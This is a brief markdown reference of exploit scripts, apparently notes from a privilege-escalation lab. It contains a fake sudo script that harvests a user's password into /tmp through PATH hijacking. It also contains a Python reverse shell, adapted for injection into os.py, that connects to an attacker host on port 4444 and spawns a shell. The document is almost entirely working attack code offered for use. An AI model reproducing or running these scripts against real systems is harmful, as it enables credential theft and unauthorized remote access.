# Exploit Scripts Reference

## Sudo Hijack Script (PATH Hijacking)

```bash
#!/bin/bash

read frank_pass
echo $frank_pass > /tmp/frank_pass
# Captures the password typed into the fake "sudo" prompt
# Check with: ls -al /tmp && cat /tmp/frank_pass
```

---

## Python Reverse Shell (Modified for `os.py` Injection)

```python
import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

> [!NOTE]
> Uses `dup2()` instead of `os.dup2()` because this runs **inside** `os.py` itself — avoids circular import.
